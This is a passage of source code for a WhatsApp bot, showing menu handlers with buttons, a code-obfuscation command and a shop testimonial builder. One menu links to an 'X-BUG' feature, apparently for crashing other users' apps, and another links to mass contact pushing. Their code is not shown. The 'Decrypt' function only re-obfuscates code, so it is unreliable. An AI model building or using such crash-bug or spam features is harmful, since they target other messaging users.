┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏


${global.menuother}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".menu", 
 buttonText: { 
 displayText: "BACK TO MENU"
 }
 }, {   
 buttonId: ".owner", 
 buttonText: {
 displayText: "OWNER"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-dorplet": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏


${global.menudgtl}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".listdorplet", 
 buttonText: { 
 displayText: "LIST DORPLET"
 }
 }, {   
 buttonId: ".cvps", 
 buttonText: {
 displayText: "CREATE VPS"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-random": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜*𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menurandom}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".menu", 
 buttonText: { 
 displayText: "BACK_TO_MENU"
 }
 }, {   
 buttonId: ".owner", 
 buttonText: {
 displayText: "OWNER"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-owner": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menuowner}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".menu", 
 buttonText: { 
 displayText: "BACK_TO_MENU"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-ai": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menuai}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".gemini halo", 
 buttonText: { 
 displayText: "GEMINI-AI"
 }
 }, {
 buttonId: ".owner", 
 buttonText: {
 displayText: "OWNER"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-download": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menudownload}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".tiktok", 
 buttonText: { 
 displayText: "TIKTOK-DL"
 }
 }, {
 buttonId: ".ytmp4", 
 buttonText: {
 displayText: "YOUTUBE-DL"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-sound": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menusound}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".soundmeme", 
 buttonText: { 
 displayText: 'SOUND-MEME' 
 }
 }, {
 buttonId: ".sound7", 
 buttonText: {
 displayText: "SOUND"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-grup": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menugrup}`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".open", 
 buttonText: { 
 displayText: 'BUKA-GRUP' 
 }
 }, {
 buttonId: ".close",
 buttonText: {
 displayText: "TUTUP-GRUP"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-store": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menustore}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".pushkontak", 
 buttonText: { 
 displayText: 'PUSHKONTAK' 
 }
 }, {
 buttonId: ".savekontak", 
 buttonText: {
 displayText: "SAVEKONTAK"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-panel": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menupanel}`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".listsrv", 
 buttonText: { 
 displayText: 'LIST-SERVER' 
 }
 }, {
 buttonId: ".listusr", 
 buttonText: {
 displayText: "LIST-USER"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-bug": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menubug}`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".xbug", 
 buttonText: { 
 displayText: 'X-BUG' 
 }
 }, {
 buttonId: ".owner", 
 buttonText: {
 displayText: "OWNER"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "enc": {
    try {
    let { JavaScriptObfuscator } = require("javascript-obfuscator")
        const modes = ["low", "high"]
        const usage = "Reply Codenyanya!!!\n\n*Example:*\n.enc high"
        if (!m.quoted) return m.reply(usage)
        const type = args.shift().toLowerCase()
        if (!modes.includes(type)) return m.reply(usage)
        const message = type === "high" ? await Encrypt(m.quoted.text) : await Decrypt(m.quoted.text)
        if (args.length >= 2) {
            const texts = args.slice(1).join(" ")
            const response = type === "high" ? await Encrypt(texts) : await Decrypt(texts)
            return m.reply(response)
        }

        return m.reply(message)

    } catch (e) {
        await m.reply("eror")
    }
async function Encrypt(query) {
    const obfuscationResult = JavaScriptObfuscator.obfuscate(query, {
        compact: true,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true,
        stringArrayShuffle: true,
        splitStrings: true,
        stringArrayThreshold: 1,
        sourceMap: false,
        sourceMapMode: "separate",
    })

    return obfuscationResult.getObfuscatedCode()
}

async function Decrypt(encryptedCode) {
    const decryptedCode = JavaScriptObfuscator.obfuscate(encryptedCode, {
        compact: false,
        controlFlowFlattening: true,
    }).getObfuscatedCode()

    return decryptedCode
}
}
break
case "addtesti": 
 // Jika media adalah view once, gambar, atau video
if (/image/.test(mime) || /video/.test(mime) || isMedia) {
let item = args[0]
let price = args[1] 
let pay = args[2]
let tekss = `*⫹⫺ TRANSAKSI DONE BY DIKZZ-SHOP✅*
*📦ITEM:* ${item}
*💵HARGA:* ${price}
*💳PAYMENT:* ${pay}
*📠DATE:* ${hariini}
▬▭▬▭▬▭▬▭▬▭▬▭▬͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏